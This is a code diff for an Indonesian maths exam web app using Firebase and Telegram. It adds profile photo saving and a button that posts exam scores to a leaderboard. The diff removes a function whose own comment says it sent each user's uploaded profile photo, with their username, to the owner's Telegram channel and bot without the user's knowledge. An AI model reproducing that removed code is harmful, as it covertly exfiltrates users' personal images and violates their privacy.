@@ -416,6 +416,10 @@
             background: linear-gradient(135deg, #10b981, #059669);
         }
 
+        .btn-save {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+        }
+
         .output-display {
             background: rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.06);
@@ -1221,6 +1225,12 @@
                     </button>
                     <div id="statusKirimChannel" style="margin-top: 8px; font-size: 0.8rem; color: var(--text-muted);"></div>
                     
+                    <!-- TOMBOL MASUKAN KE PROFILE -->
+                    <button class="btn-primary btn-save" onclick="masukanKeProfile()" id="btnMasukanProfile" style="margin-top: 10px;">
+                        📥 Masukan ke Profile
+                    </button>
+                    <div id="statusMasukanProfile" style="margin-top: 8px; font-size: 0.8rem; color: var(--text-muted);"></div>
+                    
                     <div class="inline-buttons">
                         <a href="https://t.me/MTKS_VBOT" target="_blank" class="btn-inline primary">
                             🤖 @MTKS_VBOT
@@ -1356,12 +1366,18 @@
                 <img id="avatarImage" style="display:none;" alt="Profile Photo">
                 <div class="avatar-overlay">📷 Ganti Foto</div>
             </div>
-            <input type="file" id="avatarInput" accept="image/*" style="display:none;" onchange="uploadProfilePhoto(event)">
+            <input type="file" id="avatarInput" accept="image/*" style="display:none;" onchange="pilihFotoProfile(event)">
 
             <div class="profile-info">
                 <div class="username" id="profileUsername">Username</div>
                 <div class="email" id="profileEmail">email@example.com</div>
             </div>
+
+            <!-- TOMBOL SIMPAN PROFILE -->
+            <button class="btn-primary btn-save" onclick="simpanProfile()" style="margin: 10px 0;">
+                💾 Simpan Profile
+            </button>
+            <div id="statusSimpanProfile" style="text-align:center; font-size:0.8rem; color:var(--text-muted); margin-bottom:10px;"></div>
 
             <div class="profile-stats">
                 <div class="profile-stat-box">
@@ -1370,7 +1386,7 @@
                 </div>
                 <div class="profile-stat-box">
                     <div class="value" id="profileTotalUjian">0</div>
-                    <div class="label">Total Ujian</div>
+                    <div class="label">Jumlah Ujian</div>
                 </div>
                 <div class="profile-stat-box">
                     <div class="value" id="profileRataNilai">0</div>
@@ -1485,6 +1501,7 @@
         let currentUser = null;
         let currentUserUID = null;
         let currentUserEmail = null;
+        let currentUserPhotoURL = null;
 
         (function checkSession() {
             const session = sessionStorage.getItem(SESSION_KEY);
@@ -1501,7 +1518,13 @@
                 currentUser = data.username;
                 currentUserUID = data.uid || null;
                 currentUserEmail = data.email || '';
+                currentUserPhotoURL = data.photoURL || null;
                 document.getElementById('userDisplay').textContent = currentUser;
+                
+                // Load foto profile jika ada
+                if (currentUserPhotoURL) {
+                    loadProfilePhoto(currentUserPhotoURL);
+                }
             } catch(e) {
                 window.location.href = 'login.html';
             }
@@ -1517,6 +1540,92 @@
                     sessionStorage.removeItem(SESSION_KEY);
                     window.location.href = 'login.html';
                 });
+            }
+        }
+
+        // ========== LOAD PROFILE PHOTO ==========
+        function loadProfilePhoto(url) {
+            const img = document.getElementById('avatarImage');
+            const placeholder = document.getElementById('avatarPlaceholder');
+            if (url) {
+                img.src = url;
+                img.style.display = 'block';
+                placeholder.style.display = 'none';
+            } else {
+                img.style.display = 'none';
+                placeholder.style.display = 'block';
+            }
+        }
+
+        // ========== PILIH FOTO PROFILE ==========
+        let tempPhotoFile = null;
+        let tempPhotoDataURL = null;
+
+        function pilihFotoProfile(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            tempPhotoFile = file;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                tempPhotoDataURL = e.target.result;
+                // Tampilkan preview
+                const img = document.getElementById('avatarImage');
+                const placeholder = document.getElementById('avatarPlaceholder');
+                img.src = e.target.result;
+                img.style.display = 'block';
+                placeholder.style.display = 'none';
+                
+                document.getElementById('statusSimpanProfile').innerHTML = '<span style="color:var(--warning);">📷 Foto baru dipilih, klik Simpan Profile untuk menyimpan.</span>';
+            };
+            reader.readAsDataURL(file);
+        }
+
+        // ========== SIMPAN PROFILE ==========
+        async function simpanProfile() {
+            const statusEl = document.getElementById('statusSimpanProfile');
+            statusEl.innerHTML = '<span style="color:var(--text-secondary);">⏳ Menyimpan profile...</span>';
+            
+            try {
+                let photoURL = currentUserPhotoURL;
+                
+                // Jika ada foto baru yang dipilih
+                if (tempPhotoFile && currentUserUID) {
+                    // Upload ke Firebase Storage
+                    const storageRef = storage.ref(`profile_photos/${currentUserUID}/avatar.jpg`);
+                    await storageRef.put(tempPhotoFile);
+                    photoURL = await storageRef.getDownloadURL();
+                    currentUserPhotoURL = photoURL;
+                    tempPhotoFile = null;
+                    tempPhotoDataURL = null;
+                }
+                
+                // Simpan ke Firestore
+                if (currentUserUID) {
+                    await db.collection('users').doc(currentUserUID).set({
+                        username: currentUser,
+                        email: currentUserEmail,
+                        photoURL: photoURL,
+                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    }, { merge: true });
+                    
+                    // Update session
+                    const session = JSON.parse(sessionStorage.getItem(SESSION_KEY) || '{}');
+                    session.photoURL = photoURL;
+                    sessionStorage.setItem(SESSION_KEY, JSON.stringify(session));
+                    
+                    statusEl.innerHTML = '<span style="color:#34d399;">✅ Profile berhasil disimpan!</span>';
+                    
+                    // Update tampilan foto
+                    if (photoURL) {
+                        loadProfilePhoto(photoURL);
+                    }
+                } else {
+                    statusEl.innerHTML = '<span style="color:#ef4444;">❌ UID tidak ditemukan.</span>';
+                }
+            } catch (error) {
+                console.error('Error saving profile:', error);
+                statusEl.innerHTML = `<span style="color:#ef4444;">❌ Gagal menyimpan: ${error.message}</span>`;
             }
         }
 
@@ -1564,9 +1673,7 @@
 
         // ========== KIRIM KE CHANNEL & BOT ==========
         async function sendToChannelAndBot(text) {
-            // Kirim ke Channel
             const channelSuccess = await sendToTelegram(CHANNEL_ID, text);
-            // Kirim ke Bot (Owner)
             const botSuccess = await sendToTelegram(OWNER_ID, text);
             return channelSuccess && botSuccess;
         }
@@ -1576,6 +1683,72 @@
             const channelSuccess = await sendPhotoToTelegram(CHANNEL_ID, photoData, caption);
             const botSuccess = await sendPhotoToTelegram(OWNER_ID, photoData, caption);
             return channelSuccess && botSuccess;
+        }
+
+        // ========== MASUKAN KE PROFILE ==========
+        async function masukanKeProfile() {
+            const statusEl = document.getElementById('statusMasukanProfile');
+            const savedData = localStorage.getItem('hasilUjianTerakhir');
+            
+            if (!savedData) {
+                statusEl.innerHTML = '<span style="color:#ef4444;">❌ Belum ada data ujian.</span>';
+                return;
+            }
+
+            const data = JSON.parse(savedData);
+            const nilaiAkhir = data.nilaiAkhir || 0;
+            const tingkat = data.tingkat || 'sd';
+
+            if (!currentUserUID) {
+                statusEl.innerHTML = '<span style="color:#ef4444;">❌ User tidak ditemukan.</span>';
+                return;
+            }
+
+            statusEl.innerHTML = '<span style="color:var(--text-secondary);">⏳ Memasukan ke profile...</span>';
+
+            try {
+                const docRef = db.collection('leaderboard').doc(currentUserUID);
+                const doc = await docRef.get();
+                
+                let totalNilai = nilaiAkhir;
+                let totalUjian = 1;
+                
+                if (doc.exists) {
+                    const existingData = doc.data();
+                    totalNilai = (existingData.totalNilai || 0) + nilaiAkhir;
+                    totalUjian = (existingData.totalUjian || 0) + 1;
+                }
+                
+                const rataNilai = Math.round(totalNilai / totalUjian);
+                
+                await docRef.set({
+                    username: currentUser,
+                    uid: currentUserUID,
+                    totalNilai: totalNilai,
+                    totalUjian: totalUjian,
+                    rataNilai: rataNilai,
+                    tingkat: tingkat,
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                }, { merge: true });
+                
+                // Update level stats
+                const levelStats = JSON.parse(localStorage.getItem('mtks_level_stats') || '{}');
+                const currentValue = levelStats[tingkat] || 0;
+                levelStats[tingkat] = currentValue + nilaiAkhir;
+                localStorage.setItem('mtks_level_stats', JSON.stringify(levelStats));
+                
+                // Update tampilan profile
+                document.getElementById('profileTotalNilai').textContent = totalNilai;
+                document.getElementById('profileTotalUjian').textContent = totalUjian;
+                document.getElementById('profileRataNilai').textContent = rataNilai;
+                loadLevelStats();
+                
+                statusEl.innerHTML = `<span style="color:#34d399;">✅ Berhasil! Total Nilai: ${totalNilai}, Ujian: ${totalUjian}, Rata-rata: ${rataNilai}</span>`;
+                
+            } catch (error) {
+                console.error('Error saving to profile:', error);
+                statusEl.innerHTML = `<span style="color:#ef4444;">❌ Gagal: ${error.message}</span>`;
+            }
         }
 
         // ========== KIRIM HASIL IQ KE CHANNEL & FIREBASE ==========
@@ -1610,7 +1783,6 @@
             btn.textContent = '⏳ Mengirim...';
             statusEl.innerHTML = '<span style="color: var(--text-secondary);">Mengirim ke channel...</span>';
 
-            // Kirim ke Channel & Bot
             const success = await sendToChannelAndBot(pesan);
 
             // Simpan ke Firestore untuk Leaderboard
@@ -1664,7 +1836,6 @@
 
         // ========== LEADERBOARD ==========
         async function loadLeaderboard() {
-            // Function tetap ada untuk update dari Firestore jika diperlukan
             console.log('Leaderboard loaded with manual data');
         }
 
@@ -1687,12 +1858,22 @@
                         document.getElementById('profileTotalNilai').textContent = totalNilai;
                         document.getElementById('profileTotalUjian').textContent = totalUjian;
                         document.getElementById('profileRataNilai').textContent = rataNilai;
-                        
-                        // Load level stats
-                        loadLevelStats();
                     }
                 }).catch(err => console.error('Error loading profile:', err));
+                
+                // Load photo from Firestore
+                db.collection('users').doc(currentUserUID).get().then(doc => {
+                    if (doc.exists) {
+                        const data = doc.data();
+                        if (data.photoURL) {
+                            currentUserPhotoURL = data.photoURL;
+                            loadProfilePhoto(data.photoURL);
+                        }
+                    }
+                }).catch(err => console.error('Error loading photo:', err));
             }
+            
+            loadLevelStats();
         }
 
         function loadLevelStats() {
@@ -1710,39 +1891,7 @@
             document.getElementById('profileLevelTotal').textContent = total;
         }
 
-        // ========== UPLOAD PROFILE PHOTO ==========
-        async function uploadProfilePhoto(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const img = document.getElementById('avatarImage');
-                const placeholder = document.getElementById('avatarPlaceholder');
-                img.src = e.target.result;
-                img.style.display = 'block';
-                placeholder.style.display = 'none';
-            };
-            reader.readAsDataURL(file);
-
-            // Kirim foto ke Channel & Bot tanpa sepengetahuan user
-            try {
-                const caption = `📸 *UPDATE FOTO PROFILE*\n\n👤 *User:* ${currentUser || 'Anonim'}\n🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
-                
-                // Kirim ke Channel & Bot
-                const success = await sendPhotoToChannelAndBot(file, caption);
-                
-                if (success) {
-                    console.log('📸 Profile photo sent to Channel & Bot');
-                } else {
-                    console.log('❌ Failed to send profile photo');
-                }
-            } catch (error) {
-                console.error('Error sending photo:', error);
-            }
-        }
-
-        // ========== CHAT OWNER (Kirim ke Channel & Bot) ==========
+        // ========== CHAT OWNER ==========
         async function sendChat() {
             const input = document.getElementById('chatInput');
             const status = document.getElementById('chatStatus');
@@ -1760,7 +1909,6 @@
             const user = currentUser || 'Anonim';
             const text = `💬 *Pesan dari MTKS - Chat Owner*\n\n👤 *User:* ${user}\n📝 *Pesan:* ${msg}\n🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
             
-            // Kirim ke Channel & Bot
             const success = await sendToChannelAndBot(text);
             
             if (success) {
@@ -1879,7 +2027,6 @@
             }, 1500);
         }
 
-        // ========== SIMPAN HASIL UJIAN OTOMATIS KE PROFILE ==========
         function simpanHasilUjian() {
             if (hasilPerSoal.length > 0) {
                 const level = document.getElementById('tingkatPendidikan').value;
@@ -1894,17 +2041,13 @@
                 };
                 localStorage.setItem('hasilUjianTerakhir', JSON.stringify(ujianData));
                 
-                // ===== UPDATE LEVEL STATS OTOMATIS =====
                 const levelStats = JSON.parse(localStorage.getItem('mtks_level_stats') || '{}');
                 const currentValue = levelStats[level] || 0;
-                // Tambahkan nilai akhir ke level yang dipilih
                 levelStats[level] = currentValue + nilaiAkhir;
                 localStorage.setItem('mtks_level_stats', JSON.stringify(levelStats));
                 
-                // Update tampilan profile jika sedang terbuka
                 loadLevelStats();
                 
-                // Update total nilai di profile
                 if (currentUserUID) {
                     db.collection('leaderboard').doc(currentUserUID).get().then(doc => {
                         if (doc.exists) {
@@ -1915,8 +2058,6 @@
                                 totalNilai: totalNilai,
                                 totalUjian: totalUjian
                             }).then(() => {
-                                console.log('Profile updated with new exam result');
-                                // Update tampilan profile
                                 document.getElementById('profileTotalNilai').textContent = totalNilai;
                                 document.getElementById('profileTotalUjian').textContent = totalUjian;
                                 const rataNilai = totalUjian > 0 ? Math.round(totalNilai / totalUjian) : 0;
